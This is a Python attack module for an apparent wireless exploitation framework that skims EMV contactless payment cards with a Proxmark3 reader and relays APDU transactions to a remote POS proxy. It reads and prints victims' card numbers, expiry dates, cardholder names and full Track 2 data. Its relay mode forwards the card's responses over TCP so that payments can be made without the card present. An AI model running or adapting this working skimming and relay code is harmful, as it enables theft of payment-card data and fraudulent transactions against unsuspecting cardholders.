#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""EMV contactless relay and skimming attack module.

Reads EMV contactless card data via NFC (APDU: SELECT, GPO, READ RECORD)
and optionally relays transactions between a victim card and a remote POS
terminal in real time. Exploits the lack of distance-bounding in EMV
contactless (PayWave, PayPass, ExpressPay).

References:
  https://www.emvco.com/specifications/
  https://github.com/nfc-tools/libnfc
  https://www.usenix.org/conference/usenixsecurity14/technical-sessions/presentation/roland

MITRE ATT&CK: T1557 (Adversary-in-the-Middle)
CWE: CWE-345 (Insufficient Verification of Data Authenticity)

Version: 1.0.0
"""

from __future__ import annotations

import logging
import shutil
import socket
import struct
import subprocess
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any

from wirelessxpl.core.exploit import (
    Exploit,
    OptBool,
    OptInteger,
    OptString,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
)

logger = logging.getLogger(__name__)

# EMV APDU constants
SELECT_PPSE = bytes.fromhex("00A404000E325041592E5359532E444446303100")
SELECT_PSE = bytes.fromhex("00A404000E315041592E5359532E444446303100")
GET_PROCESSING_OPTIONS = bytes.fromhex("80A8000002830000")
READ_RECORD_TPL = bytes.fromhex("00B2{record:02x}{sfi_p2:02x}00")

AID_VISA = bytes.fromhex("A0000000031010")
AID_MASTERCARD = bytes.fromhex("A0000000041010")
AID_AMEX = bytes.fromhex("A00000002501")
AID_DISCOVER = bytes.fromhex("A0000001523010")

KNOWN_AIDS: dict[str, str] = {
    "A0000000031010": "Visa",
    "A0000000041010": "Mastercard",
    "A00000002501": "Amex",
    "A0000001523010": "Discover",
    "A0000000651010": "JCB",
}


class Mode(Enum):
    SKIM = auto()
    RELAY = auto()


@dataclass
class EMVCardData:
    """Parsed data from an EMV contactless card."""
    aid: bytes = b""
    aid_label: str = ""
    pan: str = ""
    expiry: str = ""
    cardholder: str = ""
    track2_equiv: bytes = b""
    aip: bytes = b""
    afl: bytes = b""
    raw_records: list[tuple[int, int, bytes]] = field(default_factory=list)


def _build_select_aid(aid: bytes) -> bytes:
    """Build SELECT APDU for a given AID."""
    return bytes([0x00, 0xA4, 0x04, 0x00, len(aid)]) + aid + b"\x00"


def _build_read_record(record: int, sfi: int) -> bytes:
    """Build READ RECORD APDU."""
    sfi_p2 = (sfi << 3) | 0x04
    return bytes([0x00, 0xB2, record, sfi_p2, 0x00])


def _parse_tlv_tag(data: bytes, offset: int) -> tuple[int, int, bytes, int]:
    """Parse one BER-TLV element. Returns (tag, length, value, new_offset)."""
    if offset >= len(data):
        return (0, 0, b"", offset)
    tag = data[offset]
    offset += 1
    if (tag & 0x1F) == 0x1F:
        while offset < len(data):
            tag = (tag << 8) | data[offset]
            offset += 1
            if not (data[offset - 1] & 0x80):
                break
    if offset >= len(data):
        return (tag, 0, b"", offset)
    length = data[offset]
    offset += 1
    if length == 0x81:
        length = data[offset]
        offset += 1
    elif length == 0x82:
        length = (data[offset] << 8) | data[offset + 1]
        offset += 2
    end = min(offset + length, len(data))
    value = data[offset:end]
    return (tag, length, value, end)


def _extract_pan_from_track2(track2: bytes) -> tuple[str, str]:
    """Extract PAN and expiry from Track 2 Equivalent Data."""
    hex_str = track2.hex().upper()
    sep = hex_str.find("D")
    if sep < 0:
        return ("", "")
    pan = hex_str[:sep]
    expiry_raw = hex_str[sep + 1 : sep + 5]
    if len(expiry_raw) == 4:
        expiry = f"20{expiry_raw[:2]}/{expiry_raw[2:]}"
    else:
        expiry = expiry_raw
    return (pan, expiry)


class EMVContactlessRelay(Exploit):
    """EMV contactless skimming and relay attack."""

    __info__: dict[str, Any] = {
        "name": "EMV Contactless Relay",
        "description": (
            "Read EMV contactless card data (PAN, expiry, Track 2) and "
            "optionally relay APDU transactions between victim card and "
            "remote POS terminal exploiting missing distance-bounding."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://www.emvco.com/specifications/",
            "https://github.com/nfc-tools/libnfc",
            "https://www.usenix.org/conference/usenixsecurity14/technical-sessions/presentation/roland",
        ),
        "devices": ("Visa PayWave", "Mastercard PayPass", "Amex ExpressPay"),
        "severity": "critical",
        "cvss": "8.8",
        "cve": "generic",
        "mitre": ["T1557"],
    }

    mode = OptString("skim", "Mode: skim (read card data) or relay (full relay)")
    relay_host = OptString("127.0.0.1", "Remote relay peer IP (relay mode)")
    relay_port = OptInteger(4433, "Remote relay peer port")
    pm3_port = OptString("/dev/ttyACM0", "Proxmark3 serial port")
    timeout_sec = OptInteger(30, "Card detection timeout")
    dry_run = OptBool(False, "Print commands without executing")

    def __init__(self) -> None:
        super().__init__()
        self._card: EMVCardData | None = None

    def check(self) -> str:
        """Verify NFC reader availability."""
        for tool in ("nfc-list", "proxmark3"):
            if shutil.which(tool):
                return f"NFC tool available: {tool}"
        return "No NFC tools found. Install libnfc-bin or Proxmark3 client."

    def _pm3_apdu(self, apdu_hex: str) -> bytes:
        """Send raw APDU via Proxmark3 and return response bytes."""
        cmd = f"hf 14a apdu -d {apdu_hex}"
        if self.dry_run.value:
            print_info(f"[dry-run] pm3 --> {cmd}")
            return bytes.fromhex("9000")

        try:
            result = subprocess.run(
                ["proxmark3", str(self.pm3_port.value), "-c", cmd],
                capture_output=True, text=True, timeout=15,
            )
            for line in result.stdout.splitlines():
                stripped = line.strip()
                if stripped and all(c in "0123456789abcdefABCDEF " for c in stripped):
                    return bytes.fromhex(stripped.replace(" ", ""))
        except (subprocess.TimeoutExpired, FileNotFoundError, ValueError) as exc:
            logger.error("APDU failed: %s", exc)
        return b""

    def _select_ppse(self) -> bytes:
        """SELECT 2PAY.SYS.DDF01 (PPSE)."""
        print_status("[*] SELECT PPSE (2PAY.SYS.DDF01)")
        return self._pm3_apdu(SELECT_PPSE.hex())

    def _select_aid(self, aid: bytes) -> bytes:
        """SELECT a specific AID."""
        label = KNOWN_AIDS.get(aid.hex().upper(), aid.hex())
        print_status(f"[*] SELECT AID: {label}")
        return self._pm3_apdu(_build_select_aid(aid).hex())

    def _get_processing_options(self) -> bytes:
        """GET PROCESSING OPTIONS."""
        print_status("[*] GET PROCESSING OPTIONS")
        return self._pm3_apdu(GET_PROCESSING_OPTIONS.hex())

    def _read_records(self, afl: bytes) -> list[tuple[int, int, bytes]]:
        """Read records indicated by the AFL."""
        records: list[tuple[int, int, bytes]] = []
        i = 0
        while i + 3 < len(afl):
            sfi = afl[i] >> 3
            first_rec = afl[i + 1]
            last_rec = afl[i + 2]
            i += 4
            for rec_num in range(first_rec, last_rec + 1):
                apdu = _build_read_record(rec_num, sfi)
                print_info(f"    READ RECORD SFI={sfi} REC={rec_num}")
                resp = self._pm3_apdu(apdu.hex())
                if len(resp) > 2 and resp[-2:] == b"\x90\x00":
                    records.append((sfi, rec_num, resp[:-2]))
        return records

    def _skim_card(self) -> EMVCardData | None:
        """Read EMV card data."""
        card = EMVCardData()

        ppse_resp = self._select_ppse()
        if not ppse_resp or ppse_resp[-2:] != b"\x90\x00":
            print_error("[-] PPSE SELECT failed: no EMV card present?")
            return None

        aid_to_try = AID_VISA
        for aid_bytes_known, label in [(AID_VISA, "Visa"), (AID_MASTERCARD, "MC"),
                                        (AID_AMEX, "Amex")]:
            if aid_bytes_known.hex() in ppse_resp.hex():
                aid_to_try = aid_bytes_known
                break

        select_resp = self._select_aid(aid_to_try)
        if not select_resp or select_resp[-2:] != b"\x90\x00":
            print_warning("[!] AID SELECT failed, trying alternatives...")
            return None

        card.aid = aid_to_try
        card.aid_label = KNOWN_AIDS.get(aid_to_try.hex().upper(), "Unknown")

        gpo_resp = self._get_processing_options()
        if len(gpo_resp) > 4 and gpo_resp[-2:] == b"\x90\x00":
            body = gpo_resp[:-2]
            if body[0] == 0x80:
                aip_len = body[1]
                card.aip = body[2:4]
                card.afl = body[4 : 2 + aip_len]
            elif body[0] == 0x77:
                offset = 2
                while offset < len(body):
                    tag, _ln, val, offset = _parse_tlv_tag(body, offset)
                    if tag == 0x94:
                        card.afl = val
                    elif tag == 0x82:
                        card.aip = val

        if card.afl:
            card.raw_records = self._read_records(card.afl)

        for _sfi, _rec, data in card.raw_records:
            offset = 0
            while offset < len(data):
                tag, _ln, val, offset = _parse_tlv_tag(data, offset)
                if tag == 0x57:
                    card.track2_equiv = val
                    pan, expiry = _extract_pan_from_track2(val)
                    card.pan = pan
                    card.expiry = expiry
                elif tag == 0x5F20:
                    card.cardholder = val.decode("ascii", errors="replace").strip()

        return card

    def _relay_session(self) -> None:
        """Relay APDU between victim card (local) and POS (remote)."""
        host = str(self.relay_host.value)
        port = int(self.relay_port.value)
        print_status(f"[*] Relay mode: connecting to POS proxy at {host}:{port}")

        if self.dry_run.value:
            print_info("[dry-run] Would open TCP relay to POS proxy")
            return

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(float(self.timeout_sec.value))
            sock.connect((host, port))
            print_success("[+] Connected to POS proxy")

            while True:
                length_buf = sock.recv(2)
                if len(length_buf) < 2:
                    break
                apdu_len = struct.unpack(">H", length_buf)[0]
                apdu_data = sock.recv(apdu_len)
                if not apdu_data:
                    break

                print_info(f"    POS --> Card: {apdu_data.hex().upper()}")
                card_resp = self._pm3_apdu(apdu_data.hex())
                print_info(f"    Card --> POS: {card_resp.hex().upper()}")

                resp_frame = struct.pack(">H", len(card_resp)) + card_resp
                sock.sendall(resp_frame)

                if card_resp[-2:] != b"\x90\x00":
                    print_warning("[!] Card returned non-success SW, ending relay")
                    break

        except (TimeoutError, ConnectionRefusedError, OSError) as exc:
            print_error(f"[-] Relay connection failed: {exc}")
        finally:
            sock.close()

    def run(self) -> None:
        """Execute EMV contactless attack."""
        print_status("[*] EMV Contactless Relay v1.0.0")

        mode_str = str(self.mode.value).lower()

        if mode_str == "skim":
            card = self._skim_card()
            if card:
                self._card = card
                print_success(f"\n[+] Card brand: {card.aid_label}")
                if card.pan:
                    masked = card.pan[:6] + "*" * (len(card.pan) - 10) + card.pan[-4:]
                    print_success(f"[+] PAN: {masked}")
                if card.expiry:
                    print_info(f"[+] Expiry: {card.expiry}")
                if card.cardholder:
                    print_info(f"[+] Cardholder: {card.cardholder}")
                if card.track2_equiv:
                    print_info(f"[+] Track2 Equiv: {card.track2_equiv.hex().upper()}")
                print_info(f"[*] Raw records: {len(card.raw_records)}")
            else:
                print_error("[-] No card data obtained")

        elif mode_str == "relay":
            self._relay_session()

        else:
            print_error(f"[-] Unknown mode: {mode_str}. Use 'skim' or 'relay'.")
